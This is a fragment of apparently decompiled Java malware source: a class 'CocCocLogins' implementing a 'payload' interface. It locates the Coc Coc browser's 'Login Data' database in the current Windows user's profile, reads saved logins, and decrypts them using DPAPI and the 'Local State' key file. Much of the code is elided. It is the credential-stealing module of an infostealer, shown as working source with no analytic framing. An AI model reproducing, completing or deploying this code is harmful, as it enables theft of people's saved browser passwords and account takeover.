...
public class CocCocLogins implements IPayload
{
    ...
    public void run() {
        ...
        try {
            ...
            final ArrayList<String> list = getCocCocInfo();
    ...
    public static ArrayList<String> getCocCocInfo() {
        ...
        try {
            ...
            for (final File file : FileUtil.getFiles("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Local\\CocCoc\\Browser\\User Data")) {
                if (file.getName().contains("Login Data")) {
                    ...
                    while (rs != null && rs.next()) {
                        ...
                        else if (url.length() > 40 && CocCocLogins.shorten) {
        ...
        try {
            ...
            if (WinDPAPI.isPlatformSupported()) {
                ...
                if (!isV10) {
                    ...
                    if (StringUtils.isEmpty((CharSequence)CocCocLogins.localStateFileFullPathAndName)) {
                        throw new IllegalArgumentException("Local State is required");
                    }
                    final String localState = FileUtils.readFileToString(new File(CocCocLogins.localStateFileFullPathAndName));
    ...
    static {
        localStateFileFullPathAndName = "C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Local\\CocCoc\\Browser\\User Data\\Local State";
        CocCocLogins.shorten = true;
        CocCocLogins.obfus = false;
    }
}
